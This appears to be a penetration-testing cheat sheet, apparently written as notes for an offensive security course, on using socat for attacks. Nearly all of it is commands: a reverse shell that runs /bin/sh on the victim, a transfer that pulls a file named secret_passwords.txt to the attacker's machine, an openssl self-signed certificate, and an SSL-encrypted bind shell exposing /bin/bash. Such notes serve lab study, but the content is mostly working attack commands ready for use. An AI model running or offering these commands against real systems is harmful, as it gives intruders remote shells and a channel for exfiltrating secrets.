### REVERSE SHELL
On Victim Machine
```bash
socat tcp-connect:127.0.0.1:443 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
On Attacker Machine
```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

### File Transfers
On victim machine:
```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```
On Attacker machine
```bash
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Encrypted Communication
You can use the openssl application to create a self-signed certificate using the following options:

-   req: initiate a new certificate signing request
-   -newkey: generate a new private key
-   rsa:2048: use RSA encryption with a 2,048-bit key length.
-   -nodes: store the private key without passphrase protection
-   -keyout: save the key to a file
-   -x509: output a self-signed certificate instead of a certificate request
-   -days: set validity period in days
-   -out: save the certificate to a file

Once we generate the key, we will cat the certificate and its private key into a file, which we will eventually use to encrypt our bind shell.

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
Generating a 2048 bit RSA private key
.....................+++
................................+++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Try Harder Department
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

After generate the pem file we proceed to execute the bind shell over SSL
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Connect to an SSL connection:
```bash
socat - OPENSSL:10.11.0.4:443,verify=0
```